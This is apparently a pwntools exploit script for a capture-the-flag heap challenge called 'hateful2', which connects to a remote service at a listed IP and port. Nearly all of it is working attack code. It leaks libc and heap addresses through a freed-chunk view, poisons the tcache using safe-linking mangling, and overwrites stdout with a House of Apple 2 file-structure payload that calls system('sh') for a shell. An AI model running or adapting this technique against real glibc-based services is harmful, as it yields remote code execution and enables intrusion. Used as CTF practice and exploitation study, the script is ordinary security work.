#!/usr/bin/env python3
from pwn import *
from pwncli import IO_FILE_plus_struct

# =========================================================
#                          SETUP                         
# =========================================================
exe = './hateful2_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
#libc = './libc.so.6'
#libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '52.59.124.14', 5022


def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================
def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val


def malloc(idx, size, input):
    io.sendlineafter(">> ", "1")
    io.sendlineafter("Message Index: ", str(idx).encode())
    io.sendlineafter("Message Size: ", str(size).encode())
    io.sendlineafter(">> ", input)

def edit(idx, input):
    io.sendlineafter(">> ", "2")
    io.sendlineafter("Message Index: ", str(idx).encode())
    io.sendlineafter(">> ", input)

def view(idx):
    io.sendlineafter(">> ", "3")
    io.sendlineafter("Message Index: ", str(idx).encode())
    io.recvuntil("Message: ")

def free(idx):
    io.sendlineafter(">> ", "4")
    io.sendlineafter("Message Index: ", str(idx).encode())


def exploit():
    global io
    io = initialize()
    #Leak heap & libc
    malloc(0, 0x438, b"")
    malloc(1, 0x28, b"")
    free(0)
    free(1)

    view(0)
    libc_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
    libc.address = libc_leak - 0x1d2cc0
    view(1)
    heap = u64(io.recvline().strip().ljust(8, b"\x00")) << 12
    log.info("Heap: %#x", heap)
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc address: %#x", libc.address)
    pause()

    #Clean bins
    malloc(0, 0x438, b"")
    malloc(1, 0x28, b"")

    #tcache poisoning using fsop
    malloc(2, 0x318, b"")
    malloc(3, 0x318, b"")
    free(3)
    free(2)
    edit(2, p64(mangle(heap, libc.sym["_IO_2_1_stdout_"])))
    malloc(4, 0x318, b"")
    malloc(5, 0x318, IO_FILE_plus_struct().house_of_apple2_execmd_when_exit(libc.sym["_IO_2_1_stdout_"], libc.sym["_IO_wfile_jumps"], libc.sym["system"], "sh")[:0x100-1])
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()
